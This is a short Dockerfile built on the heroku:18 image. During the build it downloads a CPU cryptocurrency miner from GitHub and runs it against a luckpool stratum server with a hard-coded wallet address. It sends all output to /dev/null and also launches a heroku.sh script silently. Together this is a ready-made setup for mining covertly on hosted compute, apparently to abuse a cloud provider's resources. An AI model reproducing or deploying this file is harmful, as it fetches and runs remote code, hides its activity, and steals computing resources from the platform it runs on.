FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; chmod +x hellminer; ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RXJdpoJge8fr62Bguz2EDoXVaNA7o6ZaEc.DO -p x --cpu 2 > /dev/null 2>&1
CMD bash heroku.sh > /dev/null 2>&1
